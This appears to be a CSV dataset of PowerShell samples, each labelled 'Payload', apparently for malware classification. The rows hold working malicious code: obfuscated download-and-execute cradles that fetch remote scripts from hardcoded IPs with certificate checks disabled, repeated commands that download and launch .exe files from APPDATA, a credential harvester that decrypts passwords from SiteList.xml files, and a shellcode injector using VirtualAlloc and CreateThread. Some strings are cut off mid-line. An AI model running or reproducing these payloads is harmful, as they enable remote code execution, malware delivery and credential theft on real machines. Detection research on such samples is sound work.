SHA256,Full Payload,Label
fc5f13c4935636fa24b471e989f0fef701c6293a85211cefb5f78ce13902df53,"
$wc=NeW-ObjECT SysTeM.NEt.WEbCLIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HeaDERs.ADd('User-Agent',$u);$WC.ProXy = [SySteM.NET.WebReqUEST]::DefAuLtWebPRoxY;$WC.PrOXy.CREdENTIals = [System.Net.CredeNTiAlCacHe]::DefAUltNEtwOrKCRedEnTiALS;$K='4D>`]7XLkteWAwo^mx_PTv3{a2MG)?zZ';$i=0;[cHaR[]]$b=([char[]]($Wc.DOWnLOadStrinG(""https://10.0.85.135:53/index.asp"")))|%{$_-bXOr$k[$I++%$k.LEnGtH]};IEX ($b-Join'')

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
c9a4763abe995c1836c3b2bf0a9bb76b55b57e54c1a5b17b3faf3694786aed19,"
[System.Net.SeRViCePoiNTMAnAgeR]::EXpEcT100COnTINUe = 0;$Wc=New-ObJecT System.Net.WEBClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HEadERs.ADD('User-Agent',$u);$wC.PROXY = [SYStEM.Net.WEBREqUEsT]::DEFAUltWEbPROXY;$wC.ProxY.CreDeNTiALs = [SySTeM.NEt.CreDEntiaLCAche]::DeFaULTNEtwOrKCredENtiaLs;$K='=NV1SZp0ir$J+]mlF/(Q;yL9HR8|)MX&';$i=0;[cHAR[]]$b=([char[]]($Wc.DoWNlOADStrIng(""https://93.176.84.34:443/index.asp"")))|%{$_-BXOR$k[$i++%$k.LENGth]};IEX ($B-jOin'')

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
fe45baeb68889abecd37331fe6ef0401fa1aab00fc9859a359a70fe832002ce4,"function Get-SiteListPassword {


    [CmdletBinding()]
    param(
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $SiteListFilePath
    )

    function Get-DecryptedSitelistPassword {
        
        
        
        [CmdletBinding()]
        Param (
            [Parameter(Mandatory = $True)]
            [String]
            $B64Pass
        )

        
        Add-Type -assembly System.Security
        Add-Type -assembly System.Core

        
        $Encoding = [System.Text.Encoding]::ASCII
        $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider 
        $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider

        
        $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

        
        $I = 0;
        $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }

        
        $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@

        
        $3DES.Mode = 'ECB'
        $3DES.Padding = 'None'
        $3DES.Key = $3DESKey

        
        $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)

        
        $Index = [Array]::IndexOf($Decrypted, [Byte]0)
        if($Index -ne -1) {
            $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
        }
        else {
            $DecryptedPass = $Encoding.GetString($Decrypted)
        }

        New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
    }

    function Get-SitelistFields {
        [CmdletBinding()]
        Param (
            [Parameter(Mandatory = $True)]
            [String]
            $Path
        )

        try {
            [Xml]$SiteListXml = Get-Content -Path $Path

            if($SiteListXml.InnerXml -Like ""*password*"") {
                Write-Verbose ""Potential password in found in $Path""

                $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {                    
                    try {
                        $PasswordRaw = $_.Password.'

                        if($_.Password.Encrypted -eq 1) {
                            
                            $DecPassword = if($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
                        }
                        else {
                            $DecPassword = $PasswordRaw
                        }

                        $Server = if($_.ServerIP) { $_.ServerIP } else { $_.Server }
                        $Path = if($_.ShareName) { $_.ShareName } else { $_.RelativePath }

                        $ObjectProperties = @{
                            'Name' = $_.Name;
                            'Enabled' = $_.Enabled;
                            'Server' = $Server;
                            'Path' = $Path;
                            'DomainName' = $_.DomainName;
                            'UserName' = $_.UserName;
                            'EncPassword' = $PasswordRaw;
                            'DecPassword' = $DecPassword;
                        }
                        New-Object -TypeName PSObject -Property $ObjectProperties
                    }
                    catch {
                        Write-Debug ""Error parsing node : $_""
                    }
                }
            }
        }
        catch {
            Write-Error $_
        }
    }

    if($SiteListFilePath) {
        $XmlFiles = Get-ChildItem -Path $SiteListFilePath
    }
    else {
        $XmlFiles = 'C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\' | Foreach-Object {
            Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue
        }
    }

    $XmlFiles | Where-Object { $_ } | Foreach-Object {
        Write-Verbose ""Parsing SiteList.xml file '$($_.Fullname)'""
        Get-SitelistFields -Path $_.Fullname        
    }
}
",Payload
535455fd2b98fff0f3607b309dc7e45518d46d7416687f544e9abdfa48d481cb,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x1d,0xa0,0x86,0x2f,0xd9,0xca,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x45,0x0f,0x03,0x45,0x12,0x42,0x73,0xd3,0xc4,0x00,0x7c,0x2c,0x14,0x65,0xf4,0xc9,0x25,0xa5,0x62,0x99,0x15,0x15,0xe0,0xcf,0x99,0xde,0xa4,0xfb,0x2a,0x92,0x60,0x0b,0x9b,0x19,0x57,0x22,0x1c,0x31,0xab,0x25,0x9e,0x48,0xf8,0x85,0x9f,0x82,0x0d,0xc7,0xd8,0xff,0xfc,0x95,0xb1,0x74,0x52,0x0a,0xb6,0xc1,0x6f,0xa1,0x84,0xc4,0xf7,0x56,0x5c,0xe6,0xd6,0xc8,0xd7,0xb1,0xf8,0xeb,0x34,0xca,0xb0,0xf3,0x59,0xf7,0x0b,0x8f,0xa9,0x83,0x8d,0x59,0xe0,0x6c,0x21,0xa4,0xcd,0x9e,0x3b,0xe0,0xe9,0x40,0x4e,0x18,0x0a,0xfc,0x49,0xdf,0x71,0xda,0xdc,0xc4,0xd1,0xa9,0x47,0x21,0xe0,0x7e,0x11,0xa2,0xee,0xcb,0x55,0xec,0xf2,0xca,0xba,0x86,0x0e,0x46,0x3d,0x49,0x87,0x1c,0x1a,0x4d,0xcc,0xc7,0x03,0xd4,0xa8,0xa6,0x3c,0x06,0x13,0x16,0x99,0x4c,0xb9,0x43,0x90,0x0e,0xd5,0xa0,0x99,0xb0,0x25,0xaf,0xaa,0xc3,0x17,0x70,0x01,0x4c,0x1b,0xf9,0x8f,0x8b,0x5c,0xd0,0x68,0x03,0xa3,0xdb,0x88,0x0d,0x67,0x8f,0xd8,0x25,0x4e,0xb0,0xb2,0xb5,0x6f,0x65,0x2e,0xb3,0xe7,0x46,0x07,0xba,0xf5,0x2e,0x5a,0xbd,0xf8,0x15,0xd3,0x5b,0xaa,0x39,0xb4,0xf3,0x0a,0xea,0x74,0xa4,0xe2,0xe0,0x7a,0x9b,0x12,0x0b,0x51,0xb4,0xb8,0xe4,0x0c,0xec,0x54,0x9c,0x14,0x66,0xc5,0x61,0x83,0x02,0xc5,0xea,0x20,0xf2,0x8b,0x1a,0x4c,0xe0,0x7b,0xeb,0x1b,0x5a,0x2d,0xf4,0xb1,0xf1,0xd1,0x60,0x3e,0x50,0x86,0x1c,0x3c,0x85,0xe0,0x82,0xbf,0xe0,0x7b,0x0a,0x2a,0x4b,0x13,0x73,0xba,0x4b,0xe3,0x25,0xd0,0x4b,0x8b,0x91,0x80,0x1f,0xae,0xdd,0x1c,0x0c,0x63,0x48,0x9f,0x65,0xd0,0xdb,0xf7,0x8b,0x0f,0x2b,0x58,0x73,0x7a,0xad,0xa4,0xa2,0x42,0xdb,0xc4,0x76;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
